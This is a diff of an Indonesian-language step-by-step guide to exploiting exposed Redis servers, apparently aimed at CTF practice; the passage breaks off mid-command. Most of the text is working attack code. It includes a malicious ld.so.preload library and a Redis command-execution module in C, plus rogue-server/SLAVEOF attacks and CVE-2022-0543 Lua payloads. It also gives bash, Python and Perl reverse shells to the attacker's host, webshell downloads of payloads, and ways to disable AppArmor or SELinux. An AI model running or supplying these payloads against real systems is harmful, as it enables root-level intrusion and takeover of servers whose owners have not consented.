+# Cara D: Jika sudah ada shell redis user — eksekusi langsung dari shell
+
+# STEP 3: Jika punya redis shell — tulis dan eksekusi langsung
+# (setelah PATH 4A berhasil dapat shell redis user)
+redis-cli -h $TARGET SET revshell "#!/bin/bash\nbash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
+redis-cli -h $TARGET CONFIG SET dir /tmp/
+redis-cli -h $TARGET CONFIG SET dbfilename revshell.sh
+redis-cli -h $TARGET SAVE
+
+# Dari shell redis:
+chmod +x /tmp/revshell.sh
+/tmp/revshell.sh
 ```
 
-### FASE 5: RCE VIA REDIS MODULE LOADING
+**OUTPUT BERHASIL ✅:**
 
-```text
-📌 TUJUAN: Load malicious shared library (.so) untuk RCE
-📌 VERSI: Redis 4.x - 7.x (module support)
-📌 SUMBER: redis-rogue-server atau exploit-db
+text
+
+```
+root@target:~# (shell di listener)
 ```
 
-#### Apa itu Redis Module?
+**OUTPUT GAGAL ❌ — Tidak ada cara trigger eksekusi file:**
 
-```text
-Redis modules adalah shared library (.so) yang bisa di-load
-untuk menambah fungsionalitas Redis.
-🔥 KEKUATAN: Module bisa mengeksekusi system command
-🔥 KONDISI: Redis harus berjalan sebagai root (atau user dengan
-   permission untuk load module)
+text
+
+```
+(tidak ada service yang baca dari /tmp/, tidak ada cron, dll)
 ```
 
-#### Step-by-Step Redis Module Exploit
+➡️ Pindah ke **PATH 4E (ld.so.preload)** atau **Fase 5 (Redis Module Loading)**
 
-```bash
-# STEP 1: Clone redis-rogue-server
-git clone https://github.com/n0b0dyCN/redis-rogue-server
-cd redis-rogue-server
-# STEP 2: Compile exploit module
-cd RedisModulesSDK/
-make
-# STEP 3: Jalankan rogue server
-python3 redis-rogue-server.py --rhost TARGET --rport 6379 --lhost ATTACKER_IP --lport 4444
-# STEP 4: Atau manual dengan redis-cli
-redis-cli -h TARGET
-# Upload module ke target (via FTP/HTTP atau CONFIG SET?)
-# MODULE LOAD /path/to/exploit.so
-127.0.0.1:6379> MODULE LOAD /tmp/exp.so
+---
+
+### PATH 4E — ld.so.preload (Advanced — Redis sebagai Root)
+
+> **Tujuan:** Inject shared library yang akan diload oleh SEMUA program di sistem  
+> **Hasil:** RCE saat program apapun dijalankan  
+> **Kondisi:** Redis HARUS berjalan sebagai root — SANGAT BERBAHAYA di production!  
+> **⚠️ WARNING: Ini bisa crash sistem jika library tidak valid!**
+
+Bash
+
+```
+# STEP 1: Buat malicious shared library
+# Di attacker machine:
+cat > /tmp/evil.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void evil() {
+    // Hanya eksekusi jika belum root (untuk hindari infinite loop)
+    if (getuid() != 0) {
+        unsetenv("LD_PRELOAD");
+        system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1'");
+    }
+}
+EOF
+
+# Ganti ATTACKER_IP dan LPORT:
+sed -i "s/ATTACKER_IP/$LHOST/g; s/LPORT/$LPORT/g" /tmp/evil.c
+
+# Compile untuk target (x86_64 Linux):
+gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c
+
+# Verifikasi:
+file /tmp/evil.so
+# /tmp/evil.so: ELF 64-bit LSB shared object, x86-64, ...
+```
+
+**OUTPUT BERHASIL ✅ — Compile berhasil:**
+
+text
+
+```
+/tmp/evil.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped
+```
+
+Bash
+
+```
+# STEP 2: Upload library ke target via Redis file write
+# Caranya: encode binary ke Redis string
+# (Ini tricky karena binary data)
+
+# Method 1: Serve via HTTP, download dari redis Lua (jika ada network)
+python3 -m http.server 8080 &
+
+# STEP 3: Inject path ke /etc/ld.so.preload via Redis
+# ⚠️ FILE INI HARUS BENAR-BENAR ADA DI TARGET DULU
+# Ditulis dulu ke /tmp/evil.so (via cara lain: curl, wget dari webshell, dll)
+
+redis-cli -h $TARGET CONFIG SET dir /etc/
+redis-cli -h $TARGET CONFIG SET dbfilename ld.so.preload
+redis-cli -h $TARGET SET preload "\n/tmp/evil.so\n"
+redis-cli -h $TARGET SAVE
+
+# STEP 4: Setup listener
+nc -lvnp $LPORT &
+
+# STEP 5: Trigger dengan menjalankan program apapun di target
+# (Jika ada webshell: curl http://target/shell.php?cmd=id)
+# (Jika ada SSH: ssh user@target "id")
+# Setiap kali program dijalankan → evil.so terload → reverse shell
+```
+
+**OUTPUT BERHASIL ✅ — Reverse shell dari ld.so.preload:**
+
+text
+
+```
+$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.11.200 52341
+bash: cannot set terminal process group: Inappropriate ioctl
+root@target:/# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+➡️ **ROOT SHELL!** Segera cleanup:
+
+Bash
+
+```
+# WAJIB cleanup /etc/ld.so.preload setelah berhasil!
+# Kalau tidak, SEMUA program akan crash!
+redis-cli -h $TARGET CONFIG SET dir /etc/
+redis-cli -h $TARGET CONFIG SET dbfilename ld.so.preload
+redis-cli -h $TARGET SET preload ""
+redis-cli -h $TARGET SAVE
+# Atau dari root shell:
+echo "" > /etc/ld.so.preload
+rm /etc/ld.so.preload
+```
+
+**OUTPUT GAGAL ❌ — Redis tidak bisa write ke /etc/:**
+
+text
+
+```
+(error) ERR: CONFIG SET dir: Permission denied
+```
+
+➡️ Redis tidak punya akses ke `/etc/`. Harus ada akses root atau alternatif lain.  
+➡️ Lanjut ke **Fase 5 (Redis Module Loading)**.
+
+---
+
+### Ringkasan PATH FILE WRITE — Decision Matrix
+
+text
+
+```
+Hasil Langkah 4.0 (cek user & permission)
+│
+├─ Bisa write ke /root/.ssh/ atau /home/redis/.ssh/
+│   └─ → PATH 4A: SSH Key Injection
+│         ├─ Berhasil → Shell (redis atau root)
+│         ├─ Permission denied publickey
+│         │   ├─ Direktori .ssh belum ada → Langkah 4.0A
+│         │   ├─ StrictModes blocking → Perlu fix permission dulu
+│         │   └─ User Redis bukan di /home/ → Cek /etc/passwd
+│         └─ Port 22 closed → Pindah ke PATH lain
+│
+├─ Redis running sebagai root + bisa write ke cron dir
+│   └─ → PATH 4B: Cron Backdoor
+│         ├─ Shell masuk dalam 60 detik → ROOT SHELL
+│         ├─ Shell tidak masuk
+│         │   ├─ Cron service mati → Coba format payload lain
+│         │   ├─ Path cron salah → Test semua path cron
+│         │   ├─ Firewall outbound → Coba bind shell
+│         │   └─ Redis bukan root → Cron tidak efektif, pindah PATH
+│         └─ Permission denied ke cron dir → Pindah ke PATH lain
+│
+├─ Bisa write ke /var/www/html/ (atau web root)
+│   └─ → PATH 4C: Webshell Drop
+│         ├─ Webshell accessible + output ada → RCE → Reverse shell
+│         ├─ HTTP 404 → Cari web root yang benar
+│         ├─ HTTP 200 kosong → PHP tidak terinstall/enabled
+│         │   └─ Coba .phtml, .asp, .jsp sesuai server
+│         └─ Web server tidak ada → PATH 4D atau 4E
+│
+├─ Hanya bisa write ke /tmp/
+│   └─ → PATH 4D: Write + Trigger via service lain
+│         ├─ Ada service yang baca /tmp/ → Eksploitasi
+│         ├─ Sudah punya redis shell → chmod+x & eksekusi
+│         └─ Tidak ada trigger → Fase 5 (Module Loading)
+│
+└─ Redis sebagai root + semua dir bisa ditulis
+    └─ → PATH 4E: ld.so.preload (Advanced)
+          ├─ Berhasil → ROOT SHELL + Cleanup preload!
+          └─ Tidak bisa write /etc/ → Fase 5
+```
+
+---
+
+## FASE 5: RCE VIA REDIS MODULE LOADING
+
+> **Tujuan:** Load malicious shared library (`.so`) sebagai Redis module untuk mengeksekusi command sistem langsung dari Redis.  
+> **Syarat dasar:** Redis versi 4.x ke atas dengan MODULE support.  
+> **Ini adalah last resort** jika semua PATH di Fase 4 gagal.
+
+---
+
+### Langkah 5.0 — Pre-Check: Verifikasi Kompatibilitas Module Loading
+
+Bash
+
+```
+# CEK 1: Verifikasi versi Redis (minimal 4.0 untuk module)
+redis-cli -h $TARGET INFO server | grep redis_version
+```
+
+**OUTPUT BERHASIL ✅ — Versi support module:**
+
+text
+
+```
+redis_version:6.0.16
+```
+
+➡️ Redis 4.x - 7.x → Module loading **mungkin** didukung. Lanjut.
+
+**OUTPUT GAGAL ❌ — Versi terlalu lama:**
+
+text
+
+```
+redis_version:3.2.12
+```
+
+➡️ Redis 3.x tidak support module loading. Kembali ke Fase 4 atau cari CVE lama.  
+➡️ **Google:** `"redis 3.2 exploit CTF"` atau `"redis 3.x RCE"`
+
+Bash
+
+```
+# CEK 2: Verifikasi MODULE command tersedia
+redis-cli -h $TARGET MODULE LIST
+```
+
+**OUTPUT BERHASIL ✅ — MODULE command ada:**
+
+text
+
+```
+(empty array)
+```
+
+atau
+
+text
+
+```
+1) 1) "name"
+   2) "ReJSON"
+   ...
+```
+
+➡️ MODULE command tersedia. Lanjut ke Langkah 5.1.
+
+**OUTPUT GAGAL ❌ — MODULE command disabled:**
+
+text
+
+```
+(error) ERR unknown command 'MODULE'
+```
+
+➡️ Admin disable MODULE command. Coba:
+
+Bash
+
+```
+# Cek apakah ada rename-command di config:
+redis-cli -h $TARGET CONFIG GET rename-command
+# Mungkin MODULE direname ke nama lain
+
+# Coba via Lua:
+redis-cli -h $TARGET EVAL "return redis.call('MODULE', 'LIST')" 0
+# Jika Lua juga diblokir → MODULE benar-benar disabled
+
+# → Lanjut ke Langkah 5.5 (Alternatif saat Module Blocked)
+```
+
+Bash
+
+```
+# CEK 3: Verifikasi bisa write file ke target (untuk upload .so)
+redis-cli -h $TARGET CONFIG SET dir /tmp/
+redis-cli -h $TARGET CONFIG GET dir
+```
+
+**OUTPUT BERHASIL ✅:**
+
+text
+
+```
+1) "dir"
+2) "/tmp"
+```
+
+➡️ Bisa write ke `/tmp/`. Lanjut ke Langkah 5.1.
+
+**OUTPUT GAGAL ❌:**
+
+text
+
+```
+(error) ERR: CONFIG SET dir: Permission denied
+```
+
+➡️ Tidak bisa write file sama sekali. Lanjut ke **Langkah 5.5**.
+
+---
+
+### Langkah 5.1 — Siapkan Malicious Module
+
+> Ada dua cara: **compile manual** atau **gunakan tool otomatis**.
+
+#### Method A: Compile Manual (Lebih Control)
+
+Bash
+
+```
+# Di attacker machine — buat source code module Redis
+cat > /tmp/redis_module_shell.c << 'EOF'
+#include "redismodule.h"
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+int Shell_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
+    if (argc != 2) return RedisModule_WrongArity(ctx);
+    
+    size_t len;
+    const char *cmd = RedisModule_StringPtrLen(argv[1], &len);
+    
+    // Execute command dan return output
+    FILE *f = popen(cmd, "r");
+    if (f == NULL) {
+        return RedisModule_ReplyWithError(ctx, "Failed to execute command");
+    }
+    
+    char result[4096] = {0};
+    size_t total = 0;
+    char buf[256];
+    while (fgets(buf, sizeof(buf), f) != NULL && total < sizeof(result)-1) {
+        strncat(result, buf, sizeof(result)-total-1);
+        total += strlen(buf);
+    }
+    pclose(f);
+    
+    return RedisModule_ReplyWithStringBuffer(ctx, result, strlen(result));
+}
+
+int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
+    if (RedisModule_Init(ctx, "shell", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
+        return REDISMODULE_ERR;
+    }
+    
+    if (RedisModule_CreateCommand(ctx, "shell.exec",
+        Shell_RedisCommand, "readonly", 0, 0, 0) == REDISMODULE_ERR) {
+        return REDISMODULE_ERR;
+    }
+    
+    return REDISMODULE_OK;
+}
+EOF
+
+# Download redismodule.h header (diperlukan untuk compile)
+wget -q "https://raw.githubusercontent.com/redis/redis/unstable/src/redismodule.h" \
+    -O /tmp/redismodule.h
+
+# Compile module
+gcc -shared -fPIC -o /tmp/redis_shell.so /tmp/redis_module_shell.c \
+    -I/tmp \
+    -std=c99 \
+    -o /tmp/redis_shell.so
+
+# Verifikasi hasil compile
+file /tmp/redis_shell.so
+```
+
+**OUTPUT BERHASIL ✅ — Compile berhasil:**
+
+text
+
+```
+/tmp/redis_shell.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped
+```
+
+**OUTPUT GAGAL ❌ — Compile error:**
+
+text
+
+```
+/tmp/redis_module_shell.c:1:10: fatal error: redismodule.h: No such file or directory
+```
+
+➡️ Header tidak ada atau gagal download:
+
+Bash
+
+```
+# Download manual dari GitHub:
+curl -L "https://raw.githubusercontent.com/redis/redis/7.0/src/redismodule.h" \
+    -o /tmp/redismodule.h
+
+# Atau clone redis source:
+git clone --depth 1 https://github.com/redis/redis /tmp/redis_src
+cp /tmp/redis_src/src/redismodule.h /tmp/
+
+# Retry compile:
+gcc -shared -fPIC -o /tmp/redis_shell.so /tmp/redis_module_shell.c -I/tmp
+```
+
+#### Method B: Gunakan redis-rogue-server (Lebih Cepat)
+
+Bash
+
+```
+# Clone tool otomatis
+git clone https://github.com/n0b0dyCN/redis-rogue-server /tmp/redis-rogue
+cd /tmp/redis-rogue
+
+# Tool ini sudah include pre-compiled module
+ls -la
+# exp.so  ← pre-compiled module
+# redis-rogue-server.py
+
+# Jalankan rogue server (all-in-one: upload + load + execute)
+python3 redis-rogue-server.py \
+    --rhost $TARGET \
+    --rport 6379 \
+    --lhost $LHOST \
+    --lport $LPORT \
+    --exp ./exp.so
+```
+
+**OUTPUT BERHASIL ✅ — Rogue server berhasil:**
+
+text
+
+```
+[*] Connecting to 10.10.11.200:6379...
+[+] Connected!
+[*] Sending SLAVEOF command...
+[+] Accepted connection from rogue server
+[*] Sending module...
+[+] Module uploaded!
+[*] Loading module...
+[+] Module loaded!
+[*] Executing reverse shell...
+[+] Shell received!
+```
+
+➡️ **Shell langsung didapat!** Skip ke Langkah 5.3.
+
+**OUTPUT GAGAL ❌ — Rogue server tidak connect:**
+
+text
+
+```
+[-] Failed to connect to target
+```
+
+➡️ Coba manual method:
+
+Bash
+
+```
+# Cek apakah Redis allow SLAVEOF:
+redis-cli -h $TARGET SLAVEOF $LHOST 4444
+# Jika error "ERR SLAVEOF not allowed" → coba manual upload
+```
+
+---
+
+### Langkah 5.2 — Upload Module ke Target
+
+> Ada beberapa cara upload `.so` ke target tergantung kondisi.
+
+Bash
+
+```
+# CEK DULU: Bisa akses target dari attacker?
+ping -c 1 $TARGET
+
+# Method A: Via Redis file write (jika bisa write ke /tmp/)
+# ⚠️ Binary file tidak bisa langsung via redis-cli SET (akan corrupt)
+# Gunakan cara khusus:
+
+# Encode .so ke base64 → decode di target via webshell/LFI
+base64 /tmp/redis_shell.so | tr -d '\n' > /tmp/redis_shell.so.b64
+echo "[*] Base64 size: $(wc -c < /tmp/redis_shell.so.b64) bytes"
+```
+
+**OUTPUT BERHASIL ✅:**
+
+text
+
+```
+[*] Base64 size: 14832 bytes
+```
+
+Bash
+
+```
+# Method B: HTTP server di attacker, download dari target (butuh outbound connectivity)
+# Di attacker:
+cd /tmp && python3 -m http.server 8080 &
+
+# Di target (via webshell atau shell yang sudah ada):
+curl "http://$LHOST:8080/redis_shell.so" -o /tmp/redis_shell.so
+wget "http://$LHOST:8080/redis_shell.so" -O /tmp/redis_shell.so
+
+# Verifikasi download berhasil:
+ls -la /tmp/redis_shell.so
+file /tmp/redis_shell.so
+
+# Method C: Via webshell (jika PATH 4C sudah berhasil)
+# Upload via webshell yang sudah ada:
+curl "http://$TARGET/shell.php?cmd=wget+http://$LHOST:8080/redis_shell.so+-O+/tmp/redis_shell.so"
+curl "http://$TARGET/shell.php?cmd=ls+-la+/tmp/redis_shell.so"
+```
+
+**OUTPUT BERHASIL ✅ — File ada di target:**
+
+text
+
+```
+-rwxrwxrwx 1 www-data www-data 11224 Jan 20 10:00 /tmp/redis_shell.so
+```
+
+**OUTPUT GAGAL ❌ — Target tidak bisa akses attacker (firewall outbound):**
+
+text
+
+```
+curl: (28) Failed to connect to 10.10.14.5 port 8080: Connection timed out
+```
+
+➡️ Tidak ada koneksi outbound. Coba cara lain:
+
+Bash
+
+```
+# Cek apakah ada tool transfer di target (via webshell):
+curl "http://$TARGET/shell.php?cmd=which+curl+wget+nc+python3"
+
+# Jika ada nc (netcat):
+# Di attacker:
+nc -lvnp 9001 < /tmp/redis_shell.so &
+# Di target via webshell:
+curl "http://$TARGET/shell.php?cmd=nc+$LHOST+9001+>+/tmp/redis_shell.so"
+
+# Jika ada python3:
+# Di attacker: python3 -m http.server 8080 &
+# Di target via webshell:
+curl "http://$TARGET/shell.php?cmd=python3+-c+\"import+urllib.request%3Burllib.request.urlretrieve('http://$LHOST:8080/redis_shell.so','/tmp/redis_shell.so')\""
+```
+
+---
+
+### Langkah 5.3 — Load Module & Execute Command
+
+Bash
+
+```
+# STEP 1: Load module ke Redis
+redis-cli -h $TARGET MODULE LOAD /tmp/redis_shell.so
+```
+
+**OUTPUT BERHASIL ✅ — Module loaded:**
+
+text
+
+```
 OK
-# Jalankan system command via module
-127.0.0.1:6379> system.exec "id"
-"uid=0(root) gid=0(root) groups=0(root)"
 ```
 
-**⚠️ CATATAN PENTING:**
+**OUTPUT GAGAL ❌ — Module load error (berbagai jenis):**
 
-```text
-Module loading membutuhkan:
-1. Redis versi 4.x ke atas
-2. Redis berjalan sebagai root (atau user dengan write access ke /tmp)
-3. Kemampuan upload file .so ke target
-4. Di CTF, biasanya ini adalah "last resort" jika file write gagal
+Jenis error dan solusinya akan dibahas di **Langkah 5.4**.
+
+Bash
+
+```
+# STEP 2: Verifikasi module terload
+redis-cli -h $TARGET MODULE LIST
 ```
 
-### FASE 6: REDIS PERSISTENCE MECHANISMS
+**OUTPUT BERHASIL ✅:**
 
-```text
-📌 RDB (Redis Database Backup):
-   - Snapshot periodic
-   - File: dump.rdb
-   - Default: setiap 15 menit
-📌 AOF (Append Only File):
-   - Log semua operasi write
-   - File: appendonly.aof
-   - Lebih durable tapi lebih besar
-📌 CARA MATIKAN PERSISTENCE setelah exploit:
-   - CONFIG SET save ""
-   - CONFIG SET appendonly no
+text
+
 ```
+1) 1) "name"
+   2) "shell"
+   3) "ver"
+   4) (integer) 1
+```
+
+Bash
+
+```
+# STEP 3: Test command execution
+redis-cli -h $TARGET shell.exec "id"
+redis-cli -h $TARGET shell.exec "whoami"
+redis-cli -h $TARGET shell.exec "hostname"
+```
+
+**OUTPUT BERHASIL ✅ — Command execution berhasil:**
+
+text
+
+```
+"uid=0(root) gid=0(root) groups=0(root)\n"
+```
+
+➡️ **RCE via Redis Module!** Sekarang spawn reverse shell:
+
+Bash
+
+```
+# STEP 4: Setup listener
+nc -lvnp $LPORT &
+
+# STEP 5: Trigger reverse shell via module
+redis-cli -h $TARGET shell.exec "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
+
+# Jika bash tidak work, coba:
+redis-cli -h $TARGET shell.exec "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
+
+redis-cli -h $TARGET shell.exec "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'"
+```
+
+**OUTPUT BERHASIL ✅ — Shell di listener:**
+
+text
+
+```
+$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.11.200 52221
+bash: cannot set terminal process group (1234): Inappropriate ioctl for device
+bash: no job control in this shell
+root@target:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+➡️ **ROOT SHELL via Redis Module!** Upgrade shell:
+
+Bash
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z → stty raw -echo; fg → Enter, Enter
+export TERM=xterm
+```
+
+---
+
+### Langkah 5.4 — Troubleshoot Module Loading Errors
+
+> Ini adalah bagian paling kritis — banyak hal bisa salah saat load module.
+
+#### Error 1: Operation not permitted
+
+Bash
+
+```
+# Error:
+redis-cli -h $TARGET MODULE LOAD /tmp/redis_shell.so
+# (error) ERR Error loading shared library /tmp/redis_shell.so: Operation not permitted
+
+# Penyebab: AppArmor atau SELinux memblokir loading library dari /tmp/
+# Diagnosa:
+curl "http://$TARGET/shell.php?cmd=cat+/sys/kernel/security/apparmor/profiles+2>/dev/null+|+head"
+curl "http://$TARGET/shell.php?cmd=getenforce+2>/dev/null"  # SELinux
+
+# Solusi 1: Coba path lain yang mungkin di-whitelist AppArmor
+redis-cli -h $TARGET MODULE LOAD /var/lib/redis/redis_shell.so
+redis-cli -h $TARGET MODULE LOAD /usr/lib/redis/redis_shell.so
+redis-cli -h $TARGET MODULE LOAD /home/redis/redis_shell.so
+
+# Pindahkan file .so ke lokasi tersebut dulu:
+# Via webshell:
+curl "http://$TARGET/shell.php?cmd=cp+/tmp/redis_shell.so+/var/lib/redis/"
+redis-cli -h $TARGET MODULE LOAD /var/lib/redis/redis_shell.so
+
+# Solusi 2: Cek AppArmor profile Redis
+curl "http://$TARGET/shell.php?cmd=cat+/etc/apparmor.d/usr.bin.redis-server+2>/dev/null"
+# Lihat path apa yang di-allow untuk "mr" (module read) permission
+```
+
+**OUTPUT BERHASIL ✅ — Load dari path yang di-whitelist:**
+
+text
+
+```
+OK
+```
+
+**OUTPUT GAGAL ❌ — Semua path still Operation not permitted:**
+
+text
+
+```
+(error) ERR Error loading shared library ...: Operation not permitted
+```
+
+➡️ AppArmor/SELinux sangat strict. Coba **Disable AppArmor** (butuh root shell dulu dari cara lain):
+
+Bash
+
+```
+# Dari root shell:
+aa-disable redis-server
+# Atau:
+setenforce 0   # Untuk SELinux (temporary)
+```
+
+Jika tidak punya shell root → pindah ke **Langkah 5.5**.
+
+---
+
+#### Error 2: No such file or directory
+
+Bash
+
+```
+# Error:
+# (error) ERR Error loading shared library /tmp/redis_shell.so: No such file or directory
+
+# Verifikasi file ada di target:
+redis-cli -h $TARGET shell.exec "ls -la /tmp/" 2>/dev/null
+# atau via webshell:
+curl "http://$TARGET/shell.php?cmd=ls+-la+/tmp/"
+
+# Jika file tidak ada → upload ulang (ke Langkah 5.2)
+# Jika file ada tapi masih error → nama file mungkin salah
+redis-cli -h $TARGET shell.exec "find /tmp -name '*.so' 2>/dev/null"
+```
+
+---
+
+#### Error 3: Invalid ELF (Architecture mismatch)
+
+Bash
+
+```
+# Error:
+# (error) ERR Error loading shared library: invalid ELF header
+# atau: wrong ELF class: ELFCLASS32
+
+# Penyebab: Compile untuk arsitektur yang salah
+# Diagnosa arsitektur target:
+redis-cli -h $TARGET INFO server | grep arch_bits
+# arch_bits:64  → target 64-bit
+# arch_bits:32  → target 32-bit
+
+# Atau dari webshell:
+curl "http://$TARGET/shell.php?cmd=uname+-m"
+# x86_64 → 64-bit
+# i686   → 32-bit
+
+# Recompile untuk arsitektur yang benar:
+# Untuk 64-bit:
+gcc -shared -fPIC -m64 -o /tmp/redis_shell.so /tmp/redis_module_shell.c -I/tmp
+
+# Untuk 32-bit:
+gcc -shared -fPIC -m32 -o /tmp/redis_shell.so /tmp/redis_module_shell.c -I/tmp
+# Mungkin butuh: sudo apt install gcc-multilib
+
+# Upload ulang dan retry MODULE LOAD
+```
+
+**OUTPUT BERHASIL ✅ — Setelah recompile:**
+
+text
+
+```
+OK
+```
+
+---
+
+#### Error 4: undefined symbol
+
+Bash
+
+```
+# Error:
+# (error) ERR Error loading shared library: undefined symbol: RedisModule_GetApi
+
+# Penyebab: Module dikompile dengan API version yang tidak compatible
+# Diagnosa versi Redis:
+redis-cli -h $TARGET INFO server | grep redis_version
+
+# Solusi: Sesuaikan REDISMODULE_APIVER di source code
+# Untuk Redis 4.x:  REDISMODULE_APIVER_1
+# Untuk Redis 5.x+: REDISMODULE_APIVER_1 (biasanya masih OK)
+# Untuk Redis 7.x:  Mungkin perlu update header
+
+# Download header yang sesuai dengan versi target:
+REDIS_VERSION=$(redis-cli -h $TARGET INFO server | grep redis_version | cut -d: -f2 | tr -d '\r ')
+wget -q "https://raw.githubusercontent.com/redis/redis/refs/tags/$REDIS_VERSION/src/redismodule.h" \
+    -O /tmp/redismodule.h
+
+# Recompile:
+gcc -shared -fPIC -o /tmp/redis_shell.so /tmp/redis_module_shell.c -I/tmp
+
+# Retry MODULE LOAD
+```
+
+---
+
+#### Error 5: MODULE command disabled / renamed
+
+Bash
+
+```
+# Error:
+# (error) ERR unknown command 'MODULE'
+# atau:
+# (error) ERR unknown command 'MODULE', with args beginning with: 'LOAD' '/tmp/shell.so'
+
+# Penyebab: Admin rename/disable MODULE command di redis.conf
+# Cek konfigurasi:
+redis-cli -h $TARGET CONFIG GET rename-command 2>/dev/null
+redis-cli -h $TARGET CONFIG GET bind-source-addr 2>/dev/null  # Cek config accessibility
+
+# Coba nama alternatif yang mungkin digunakan admin:
+for cmd in "MODULE" "module" "MOD" "LOADMOD" "RMODULE"; do
+    result=$(redis-cli -h $TARGET $cmd LIST 2>&1)
+    if ! echo "$result" | grep -q "unknown command"; then
+        echo "[+] MODULE command is named: $cmd"
+    fi
+done
+
+# Coba via Lua (jika Lua tidak juga diblokir):
+redis-cli -h $TARGET EVAL "return redis.call('MODULE', 'LOAD', '/tmp/shell.so')" 0
+```
+
+**OUTPUT BERHASIL ✅ — MODULE via Lua:**
+
+text
+
+```
+OK
+```
+
+**OUTPUT GAGAL ❌ — Semua cara blocked:**
+
+text
+
+```
+(error) ERR unknown command 'MODULE'
+(error) ERR This Redis command is not allowed from scripts
+```
+
+➡️ MODULE benar-benar diblokir → Lanjut ke **Langkah 5.5**
+
+---
+
+#### Error 6: Versi Redis tidak support module (< 4.0)
+
+Bash
+
+```
+# Redis versi 3.x tidak punya MODULE command sama sekali
+redis-cli -h $TARGET INFO server | grep redis_version
+# redis_version:3.2.12
+
+# Tidak ada solusi untuk enable module di versi ini
+# Opsi:
+# 1. Cek CVE untuk versi 3.x:
+echo "Redis 3.x CVEs:"
+echo "CVE-2015-4335 - eval sandbox bypass (3.0.x)"
+echo "CVE-2016-8339  - buffer overflow (3.2.x)"
+
+# 2. Coba SLAVEOF attack jika tidak ada di sini
+# 3. Kembali ke Fase 4 (file write attacks)
+```
+
+---
+
+### Langkah 5.5 — Alternatif saat Module Diblokir/Tidak Didukung
+
+> **Scenario:** Semua cara module loading gagal. Redis versi tidak support, atau ada AppArmor/SELinux yang sangat ketat, atau MODULE command disabled.
+
+#### Alternatif 5.5A — SLAVEOF / Replica Attack
+
+Bash
+
+```
+# Konsep: Jadikan target Redis sebagai SLAVE dari attacker
+# Attacker jalan redis-server palsu yang kirim malicious RDB
+# → Target load RDB yang sudah berisi module
+# Tool: redis-rogue-server
+
+git clone https://github.com/n0b0dyCN/redis-rogue-server /tmp/redis-rogue
+cd /tmp/redis-rogue
+
+# Jalankan:
+python3 redis-rogue-server.py \
+    --rhost $TARGET \
+    --rport 6379 \
+    --lhost $LHOST \
+    --lport $LPORT
+
+# Atau versi lebih baru:
+git clone https://github.com/Ridter/redis-rce /tmp/redis-rce
+cd /tmp/redis-rce
+python3 redis-rce.py -r $TARGET -L $LHOST -P $LPORT -f exp.so
+```
+
+**OUTPUT BERHASIL ✅:**
+
+text
+
+```
+[*] Trying to set target as slave...
+[+] Done! Target is now slave of attacker
+[*] Sending malicious RDB with module...
+[+] Module loaded via SLAVEOF attack!
+[*] Executing command...
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**OUTPUT GAGAL ❌ — SLAVEOF disabled:**
+
+text
+
+```
+(error) ERR SLAVEOF not allowed in cluster mode
+```
+
+atau:
+
+text
+
+```
+(error) ERR REPLICAOF not allowed in sentinel mode
+```
+
+➡️ Redis dalam cluster/sentinel mode. SLAVEOF tidak bisa. Coba **Alternatif 5.5B**.
+
+---
+
+#### Alternatif 5.5B — Lua Script RCE (CVE-2022-0543)
+
+Bash
+
+```
+# Versi vulnerable: Redis 7.0.0 - 7.0.4 di Debian/Ubuntu
+# Debian/Ubuntu package Lua tidak di-sandbox dengan benar
+
+# Cek versi dan OS:
+redis-cli -h $TARGET INFO server | grep -E "redis_version|os"
+# Harus: os:Linux ... (Debian/Ubuntu)
+# Dan:   redis_version:7.0.0 sampai 7.0.4
+
+# Test apakah vulnerable:
+redis-cli -h $TARGET EVAL "
+local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io');
+local io = io_l();
+local f = io.popen('id', 'r');
+local res = f:read('*a');
+f:close();
+return res
+" 0
+```
+
+**OUTPUT BERHASIL ✅:**
+
+text
+
+```
+"uid=0(root) gid=0(root) groups=0(root)\n"
+```
+
+➡️ **CVE-2022-0543 WORKS!** Spawn reverse shell:
+
+Bash
+
+```
+# Setup listener
+nc -lvnp $LPORT &
+
+redis-cli -h $TARGET EVAL "
+local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io');
+local io = io_l();
+local f = io.popen('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\" &', 'r');
+f:close()
+" 0
+```
+
+**OUTPUT GAGAL ❌ — Library tidak ditemukan:**
+
+text
+
+```
+(error) ERR Error running script: ...: module 'io' not found
+```
+
+➡️ Coba path library yang berbeda:
+
+Bash
+
+```
+# Enumerate library yang ada:
+redis-cli -h $TARGET EVAL "return package.path" 0
+redis-cli -h $TARGET EVAL "return package.cpath" 0
+
+# Coba path alternatif:
+for libpath in \
+    "/usr/lib/x86_64-linux-gnu/liblua5.1.so.0" \
